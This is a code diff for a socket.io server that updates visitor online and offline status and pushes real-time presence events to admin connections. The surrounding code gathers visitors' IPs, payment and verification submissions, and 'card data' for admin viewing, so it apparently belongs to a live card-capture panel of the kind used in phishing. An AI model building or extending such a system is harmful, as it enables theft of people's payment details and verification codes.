@@ -138,32 +138,50 @@ io.on('connection', (socket) => {
         return;
       }
 
+      // IMPORTANT: Clear any pending offline timers FIRST before any other operations
+      // This ensures that when user navigates to a new page, the new connection overrides the disconnect timer
+      if (offlineTimers.has(sessionId)) {
+        clearTimeout(offlineTimers.get(sessionId));
+        offlineTimers.delete(sessionId);
+        console.log(`🔄 visitor:init: cancelled offline timer for ${sessionId}`);
+      }
+      
+      // Track visitor as online in memory FIRST
+      isOnlineVisitors.add(sessionId);
+      
       // Update or insert visitor
+      // IMPORTANT: Set is_online = true and visit_status = 'online' to clear any offline/disconnected state
       await pool.query(`
-        INSERT INTO visitors (session_id, ip_address, country, country_code, user_agent, current_page, is_online)
-        VALUES ($1, $2, $3, $4, $5, $6, true)
+        INSERT INTO visitors (session_id, ip_address, country, country_code, user_agent, current_page, is_online, visit_status)
+        VALUES ($1, $2, $3, $4, $5, $6, true, 'online')
         ON CONFLICT (session_id) 
         DO UPDATE SET 
           is_online = true, 
+          visit_status = 'online',
           current_page = $6,
           last_activity = CURRENT_TIMESTAMP
       `, [sessionId, ip, geo?.country || 'Unknown', geo?.country || 'XX', userAgent, page]);
       
-      // Track visitor as online in memory
-      isOnlineVisitors.add(sessionId);
-      
-      // Cancel any pending offline timer if visitor reconnects
-      if (offlineTimers.has(sessionId)) {
-        clearTimeout(offlineTimers.get(sessionId));
-        offlineTimers.delete(sessionId);
-        console.log(`🔄 Reconnected: cancelled offline timer for ${sessionId}`);
-      }
-
-      // Get full visitor data
-      const visitorResult = await pool.query(
+      // Broadcast online status to admin immediately
+      // Query will be reused below, so we store the result
+      let visitorResultForBroadcast = await pool.query(
         'SELECT * FROM visitors WHERE session_id = $1',
         [sessionId]
       );
+      
+      if (visitorResultForBroadcast.rows[0]) {
+        const eventData = {
+          ...visitorResultForBroadcast.rows[0],
+          timestamp: new Date()
+        };
+        
+        adminConnections.forEach((adminSocket) => {
+          adminSocket.emit('visitor:online', eventData);
+        });
+      }
+
+      // Get full visitor data (reuse the query result)
+      const visitorResult = visitorResultForBroadcast;
       
       // Get all form submissions for this visitor
       let submissionsMap = {};
@@ -255,10 +273,23 @@ io.on('connection', (socket) => {
     clientInfo.currentPage = page;
     
     try {
+      // IMPORTANT: Clear any pending offline timers FIRST
+      // This ensures that when user navigates to a new page, the new connection overrides the disconnect timer
+      if (offlineTimers.has(sessionId)) {
+        clearTimeout(offlineTimers.get(sessionId));
+        offlineTimers.delete(sessionId);
+        console.log(`🔄 visitor:page: cancelled offline timer for ${sessionId}`);
+      }
+      
+      // IMPORTANT: Set is_online = true and visit_status = 'online' to clear any disconnected state
+      // This ensures that when user navigates to a new page, the new connection overrides the disconnect
       await pool.query(
-        'UPDATE visitors SET current_page = $1, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
-        [page, sessionId]
+        'UPDATE visitors SET is_online = true, visit_status = $1, current_page = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
+        ['online', page, sessionId]
       );
+      
+      // Track visitor as online in memory
+      isOnlineVisitors.add(sessionId);
 
       // Get full visitor data for payment page (to show existing card data in admin)
       const visitorResult = await pool.query(
@@ -301,12 +332,26 @@ io.on('connection', (socket) => {
       visitorData.payment_submissions = submissionsMap[`${sessionId}_payment`] || [];
       visitorData.verification_submissions = submissionsMap[`${sessionId}_verification`] || [];
 
-      // Notify all admins with FULL visitor data
+      // CRITICAL: Broadcast online status FIRST to override any disconnected state
+      adminConnections.forEach((adminSocket) => {
+        adminSocket.emit('visitor:online', {
+          ...visitorData,
+          sessionId,
+          page,
+          is_online: true,
+          visit_status: 'online',
+          timestamp: new Date()
+        });
+      });
+      
+      // Then notify with FULL visitor data for page change
       adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('visitor:pageChange', {
           ...visitorData,
           sessionId,
           page,
+          is_online: true,
+          visit_status: 'online',
           timestamp: new Date()
         });
         // Also emit visitor:updated to update the card in real-time
@@ -1196,7 +1241,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Handle disconnect - Grace period before marking offline
+  // Handle disconnect - Immediate presence update + Grace period before marking offline
   socket.on('disconnect', async () => {
     const client = connectedClients.get(socket.id);
     
@@ -1206,6 +1251,14 @@ io.on('connection', (socket) => {
       if (client.isAdmin) {
         adminConnections.delete(socket.id);
       } else {
+        // IMMEDIATE: Emit visitor:disconnected event right away for instant feedback
+        adminConnections.forEach((adminSocket) => {
+          adminSocket.emit('visitor:disconnected', { 
+            sessionId: client.sessionId,
+            timestamp: new Date()
+          });
+        });
+        
         // Immediately mark as idle (not offline yet)
         try {
           await pool.query(
